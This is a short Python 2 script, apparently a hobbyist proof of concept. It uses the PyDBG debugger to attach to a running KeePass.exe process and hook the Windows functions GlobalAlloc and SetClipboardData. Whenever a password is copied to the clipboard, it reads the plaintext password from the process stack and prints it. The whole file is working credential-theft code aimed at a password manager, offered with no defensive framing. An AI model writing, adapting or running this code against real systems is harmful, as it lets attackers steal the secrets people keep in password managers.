'''
PyDBG fucking around with KeePass...


More technical explanation:

Following functions are called when copying data to the clipboard:

 * OpenClipboard()
 * EmptyClipboard()
 * hClipboardData = GlobalAlloc()   <--- hook this and get RetValue
 * pchData = (char*)GlobalLock(hClipboardData)
 * strcpy(pchData, LPCSTR(strData))
 * GlobalUnlock(hClipboardData)
 * SetClipboardData(CF_TEXT, hClipboardData)   <--- Hook this and check if arguments are right
 * CloseClipboard()
'''

from pydbg import *
from pydbg.defines import *
from ctypes import *

from string import *


import sys
import utils
import struct



__VERSION__ = '1.2'

# Some Windows API Cram
GMEM_MOVEABLE    = 0x0002    # Flag for GlobalAlloc (Clipboard activity)
CF_TEXT            = 0x01        # Standard Clipboard Format        

hClipboardData    = None


dbg = pydbg()

###############################################################################
# Find the process' PID.
# Search by name.

plist = dbg.enumerate_processes()

for p in plist:
    if p[1] == "KeePass.exe":
        pid_keepass = p[0]
        print "Found KeePass.exe - PID %d" % p[0]
        
        
        
# Attach to the process.
dbg.attach(int(pid_keepass))

# Define the hook container.
hooks = utils.hook_container()

# Resolve the interesting function's addresses.
gAllocAddr    = dbg.func_resolve("kernel32.dll", "GlobalAlloc")    # Exit Hook: hClipboadData
sClipAddr    = dbg.func_resolve("user32.dll", "SetClipboardData")# Entry Hook: check right args

###############################################################################
# Define the hooks

def GlobalAllocHook(dbg, args, ret):
    '''
    Exit hook to read the HGLOBAL hClipboardData (return value)
    The size parameter of the allocation is read as well.
    '''
    global hClipboardData
    global AllocSize
    
    if args[0] == GMEM_MOVEABLE:
        AllocSize = int(args[1])
    else:
        pass
        
    
    hClipboardData = ret
    
    return DBG_CONTINUE
    


def SetClipboardDataHook(dbg, args):
    '''
    Just checking if the arguments are consistent with 
    the previous function calls and read the password 
    from the stack.
    '''
    
    if args[0] == CF_TEXT and args[1] == hClipboardData:
        # At the moment of the call, [ESP + 0x1C]
        # points to the password ASCII string
        
        parameter_addr = dbg.context.Esp + 0x1C
        sAddress = dbg.read_process_memory(parameter_addr, 4)
        sAddress = struct.unpack("L", sAddress)[0]
        sCredential = dbg.get_ascii_string(sAddress)
        
        print "[*] Credential copied to clipboard: %s" % sCredential
        
        
    return DBG_CONTINUE
    
###############################################################################
# SET the hooks!
hooks.add(dbg, gAllocAddr, 2, None, GlobalAllocHook)    # Exit hook
hooks.add(dbg, sClipAddr, 2, SetClipboardDataHook, None)# Entry hook


# Let the program run!
dbg.run()